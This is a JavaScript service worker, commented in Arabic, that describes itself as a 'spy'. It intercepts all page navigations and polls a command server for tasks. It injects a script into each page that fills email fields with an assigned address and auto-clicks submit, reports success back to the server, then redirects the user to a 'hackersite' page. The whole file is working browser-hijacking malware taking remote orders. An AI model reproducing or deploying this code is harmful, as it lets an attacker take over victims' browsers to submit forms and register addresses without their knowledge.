// sw.js - ملف الجاسوس (Service Worker)

// **مهم:** يجب أن تستخدم عنوان الخادم الحقيقي هنا
// هذا عنوان مثالي للاختبار المحلي، قم بتغييره لاحقاً
const SERVER_URL = 'http://localhost:5000'; 

// هذا الحدث يعمل مرة واحدة عند تثبيت الجاسوس
self.addEventListener('install', event => {
  console.log('الجاسوس تم تثبيته.');
  self.skipWaiting();
});

// هذا الحدث يعمل عندما يصبح الجاسوس نشطاً
self.addEventListener('activate', event => {
  console.log('الجاسوس أصبح نشطاً.');
  clients.claim();
});

// دالة لجلب مهمة من الخادم
async function fetchTaskFromServer() {
  try {
    const response = await fetch(`${SERVER_URL}/get-task`);
    if (!response.ok) {
      throw new Error('لا توجد مهام متاحة');
    }
    const task = await response.json();
    return task;
  } catch (error) {
    console.error('فشل الاتصال بالخادم:', error);
    return null;
  }
}

// دالة لإبلاغ الخادم بإكمال المهمة
async function reportCompletion(taskId, status) {
  try {
    await fetch(`${SERVER_URL}/report-completion`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ task_id: taskId, status: status })
    });
    console.log(`تم إبلاغ الخادم بإكمال المهمة ${taskId}`);
  } catch (error) {
    console.error('فشل إبلاغ الخادم:', error);
  }
}

// هذا هو الحدث الرئيسي الذي يعترض التنقلات
self.addEventListener('fetch', event => {
  if (event.request.mode === 'navigate') {
    event.respondWith(
      (async () => {
        // جلب مهمة جديدة من الخادم
        const task = await fetchTaskFromServer();

        // إذا لم تكن هناك مهمة، دع الصفحة تمر بشكل طبيعي
        if (!task) {
          return fetch(event.request);
        }

        // إذا كانت هناك مهمة، قم بحقن السكريبت
        const response = await fetch(event.request);
        const modifiedText = (await response.text()).replace(
          '</body>',
          `
          <script>
            console.log('تم حقن السكريبت لتنفيذ المهمة.');
            const taskData = ${JSON.stringify(task)}; // تمرير بيانات المهمة للسكريبت

            window.addEventListener('load', () => {
              const emailField = document.querySelector('input[type="email"]');
              if (emailField) {
                emailField.value = taskData.assigned_email;
                console.log(\`تم ملء حقل الإيميل بـ: \${taskData.assigned_email}\`);
              }

              const submitButton = document.querySelector('button[type="submit"], input[type="submit"]');
              if (submitButton) {
                submitButton.click();
                console.log('تم الضغط على زر الإرسال.');
                
                // إبلاغ الخادم بالنجاح ثم العودة
                navigator.serviceWorker.ready.then(registration => {
                    registration.active.postMessage({ type: 'REPORT_SUCCESS', taskId: taskData.task_id });
                });
              }

              setTimeout(() => {
                // **مهم:** يجب أن يكون هذا هو رابط صفحتك على GitHub Pages
                window.location.href = 'https://tvata6.github.io/hackersite'; 
              }, 2000);
            });
          </script></body>`
        );
        return new Response(modifiedText, {
          headers: response.headers
        });
      })()
    );
  }
});

// الاستماع لتقارير النجاح من السكريبت المحقون
self.addEventListener('message', event => {
  if (event.data && event.data.type === 'REPORT_SUCCESS') {
    reportCompletion(event.data.taskId, 'success');
  }
});
